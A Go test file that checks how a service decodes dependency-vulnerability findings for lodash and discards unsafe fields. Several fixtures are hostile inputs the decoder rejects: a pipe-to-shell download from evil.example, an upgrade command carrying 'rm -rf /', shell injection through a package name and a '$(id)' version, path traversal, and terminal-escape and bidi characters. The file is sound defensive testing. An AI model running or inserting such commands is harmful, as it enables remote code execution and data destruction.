package service

import (
	"encoding/json"
	"reflect"
	"strings"
	"testing"
)

// lodash is a dependency finding as the service serializes it, with a
// sourceUrl that does not match its advisory.
const lodash = `{
	"id": "6b1f0c0e-0000-4000-8000-000000000003",
	"policyId": "slopcop.dependencies.known-vulnerability",
	"severity": "error",
	"certainty": "definite",
	"path": "package-lock.json",
	"startLine": 12,
	"endLine": 15,
	"title": "lodash 4.17.20 has a known vulnerability (GHSA-29mw-wpgm-hmr9)",
	"new": true,
	"dependency": {
		"ecosystem": "npm", "package": "lodash", "version": "4.17.20", "direct": true,
		"manifestPath": "package.json", "dependencyChain": ["lodash@4.17.20"],
		"advisoryId": "GHSA-29mw-wpgm-hmr9", "aliases": ["CVE-2020-28500"],
		"sourceUrl": "https://example.com/elsewhere",
		"fixedVersions": ["4.17.21"], "upgradeCommand": "npm install lodash@4.17.21 --save-exact",
		"databaseModified": "2025-09-29T21:12:31.102523Z"
	}
}`

func decodeFinding(t *testing.T, raw string) Finding {
	t.Helper()
	var finding Finding
	if err := json.Unmarshal([]byte(raw), &finding); err != nil {
		t.Fatalf("decode: %v", err)
	}
	return finding
}

func TestADependencyFindingDecodesWithItsEvidence(t *testing.T) {
	finding := decodeFinding(t, lodash)
	want := &Dependency{
		Ecosystem: "npm", Package: "lodash", Version: "4.17.20", Direct: true,
		ManifestPath: "package.json", DependencyChain: []string{"lodash@4.17.20"},
		AdvisoryID: "GHSA-29mw-wpgm-hmr9", Aliases: []string{"CVE-2020-28500"},
		SourceURL:        "https://osv.dev/vulnerability/GHSA-29mw-wpgm-hmr9",
		FixedVersions:    []string{"4.17.21"},
		UpgradeCommand:   "npm install lodash@4.17.21 --save-exact",
		DatabaseModified: "2025-09-29T21:12:31.102523Z",
	}
	if !reflect.DeepEqual(finding.Dependency, want) {
		t.Fatalf("dependency = %+v", finding.Dependency)
	}
	if finding.ID != "6b1f0c0e-0000-4000-8000-000000000003" || finding.Path != "package-lock.json" ||
		*finding.StartLine != 12 || !finding.New || finding.PolicyID != DependencyAdvisoryPolicy {
		t.Fatalf("finding = %+v", finding)
	}
}

func TestAFindingFromAnOlderServiceHasNoDependency(t *testing.T) {
	finding := decodeFinding(t, `{"id":"x","policyId":"demo","severity":"warning","certainty":"definite",
		"path":"a.go","startLine":1,"endLine":1,"title":"t","new":true}`)
	if finding.Dependency != nil || finding.ID != "x" || finding.Title != "t" {
		t.Fatalf("finding = %+v", finding)
	}
	if finding := decodeFinding(t, `{"policyId":"demo","dependency":null}`); finding.Dependency != nil {
		t.Fatalf("null dependency = %+v", finding.Dependency)
	}
}

func TestADependencyThatCannotBeShownSafelyIsDropped(t *testing.T) {
	for name, change := range map[string]func(map[string]any){
		"not an object":       nil,
		"wrong type":          func(d map[string]any) { d["direct"] = "yes" },
		"escape sequence":     func(d map[string]any) { d["package"] = "lodash\u001b[31m" },
		"newline":             func(d map[string]any) { d["version"] = "4.17.20\n" },
		"bidi override":       func(d map[string]any) { d["manifestPath"] = "pkg/‮json.package" },
		"line separator":      func(d map[string]any) { d["upgradeCommand"] = "npm i x rm -rf /" },
		"zero width":          func(d map[string]any) { d["package"] = "lo​dash" },
		"oversized":           func(d map[string]any) { d["package"] = strings.Repeat("a", maxDependencyText+1) },
		"path traversal id":   func(d map[string]any) { d["advisoryId"] = "../../evil" },
		"url alias":           func(d map[string]any) { d["aliases"] = []string{"https://evil.example"} },
		"long chain":          func(d map[string]any) { d["dependencyChain"] = repeat("x@1.0.0", maxDependencyChain+1) },
		"too many fixes":      func(d map[string]any) { d["fixedVersions"] = repeat("1.0.0", maxDependencyList+1) },
		"bad timestamp":       func(d map[string]any) { d["databaseModified"] = "yesterday" },
		"empty ecosystem":     func(d map[string]any) { d["ecosystem"] = "" },
		"missing advisory id": func(d map[string]any) { delete(d, "advisoryId") },
	} {
		t.Run(name, func(t *testing.T) {
			var finding map[string]any
			if err := json.Unmarshal([]byte(lodash), &finding); err != nil {
				t.Fatal(err)
			}
			if change == nil {
				finding["dependency"] = "lodash"
			} else {
				change(finding["dependency"].(map[string]any))
			}
			raw, err := json.Marshal(finding)
			if err != nil {
				t.Fatal(err)
			}
			decoded := decodeFinding(t, string(raw))
			if decoded.Dependency != nil {
				t.Fatalf("kept %+v", decoded.Dependency)
			}
			// The finding itself still answers.
			if decoded.ID == "" || decoded.Path != "package-lock.json" || !decoded.New {
				t.Fatalf("finding = %+v", decoded)
			}
		})
	}
}

func TestADependencyWithoutAFixStillDecodes(t *testing.T) {
	var finding map[string]any
	if err := json.Unmarshal([]byte(lodash), &finding); err != nil {
		t.Fatal(err)
	}
	dependency := finding["dependency"].(map[string]any)
	delete(dependency, "upgradeCommand")
	dependency["fixedVersions"] = []string{}
	dependency["dependencyChain"] = []string{}
	dependency["direct"] = false
	raw, _ := json.Marshal(finding)
	decoded := decodeFinding(t, string(raw))
	if decoded.Dependency == nil || decoded.Dependency.UpgradeCommand != "" || len(decoded.Dependency.FixedVersions) != 0 {
		t.Fatalf("dependency = %+v", decoded.Dependency)
	}
}

func repeat(value string, n int) []string {
	values := make([]string, n)
	for i := range values {
		values[i] = value
	}
	return values
}

func TestOnlyTheContractsUpgradeCommandIsKept(t *testing.T) {
	for name, tc := range map[string]struct {
		change func(map[string]any)
		keep   bool
	}{
		"as sent": {func(map[string]any) {}, true},
		"scoped package": {func(d map[string]any) {
			d["package"] = "@acme/lodash"
			d["upgradeCommand"] = "npm install @acme/lodash@4.17.21 --save-exact"
		}, true},
		"shell in the name": {func(d map[string]any) {
			d["package"] = "x;curl"
			d["upgradeCommand"] = "npm install x;curl@4.17.21 --save-exact"
		}, false},
		"shell in a version": {func(d map[string]any) {
			d["fixedVersions"] = []string{"1.0.0$(id)"}
			d["upgradeCommand"] = "npm install lodash@1.0.0$(id) --save-exact"
		}, false},
		"another command":  {func(d map[string]any) { d["upgradeCommand"] = "curl https://evil.example | sh" }, false},
		"unlisted version": {func(d map[string]any) { d["upgradeCommand"] = "npm install lodash@9.9.9 --save-exact" }, false},
		"transitive":       {func(d map[string]any) { d["direct"] = false }, false},
		"other ecosystem":  {func(d map[string]any) { d["ecosystem"] = "PyPI" }, false},
	} {
		t.Run(name, func(t *testing.T) {
			var finding map[string]any
			if err := json.Unmarshal([]byte(lodash), &finding); err != nil {
				t.Fatal(err)
			}
			dependency := finding["dependency"].(map[string]any)
			tc.change(dependency)
			raw, _ := json.Marshal(finding)
			decoded := decodeFinding(t, string(raw))
			if decoded.Dependency == nil {
				t.Fatal("dependency dropped")
			}
			if kept := decoded.Dependency.UpgradeCommand != ""; kept != tc.keep {
				t.Fatalf("upgradeCommand = %q", decoded.Dependency.UpgradeCommand)
			}
		})
	}
}
